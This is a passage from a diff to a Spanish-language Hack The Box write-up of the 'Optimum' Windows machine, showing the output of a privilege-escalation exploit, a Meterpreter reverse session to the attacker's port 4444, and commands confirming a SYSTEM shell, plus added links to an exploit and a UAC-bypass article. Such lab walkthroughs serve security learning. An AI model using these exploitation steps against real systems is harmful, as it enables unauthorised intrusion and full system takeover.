++     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodException
+    + FullyQualifiedErrorId : MethodArgumentConversionInvalidCastArgument
+. 
+[>] Starting token race
+[>] Starting process race
+[!] Holy handle leak Batman, we have a SYSTEM shell!!
+.
+4EDKxA5vE7QaBz8XYpkCzVQhmf78eB0p
+[+] Executed on target machine.
+[*] Sending stage (175686 bytes) to 10.10.10.8
+[*] Meterpreter session 2 opened (Tu_IP:4444 -> 10.10.10.8:49163)
+[+] Deleted C:\Users\kostas\AppData\Local\Temp\uFuAbbcLlZcEA.ps1
+.
+meterpreter > sysinfo
+Computer        : OPTIMUM
+OS              : Windows 2012 R2 (6.3 Build 9600).
+Architecture    : x64
+System Language : el_GR
+Domain          : HTB
+Logged On Users : 3
+Meterpreter     : x86/windows
+meterpreter > shell
+Process 1852 created.
+Channel 1 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+.
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+```
+
+Y listo, con esto hemos completado esta máquina.
 
 
 <br>
@@ -488,6 +796,8 @@ nt authority\system
 * https://www.aon.com/cyber-solutions/aon_cyber_labs/introducing-windows-exploit-suggester/
 * https://www.reddit.com/r/learnpython/comments/ft0h3p/windowsexploitsuggester_error/
 * https://tecnonucleous.com/2018/04/05/certutil-exe-podria-permitir-que-los-atacantes-descarguen-malware-mientras-pasan-por-alto-el-antivirus/
+* https://www.exploit-db.com/exploits/39719
+* https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
 
 
 <br>
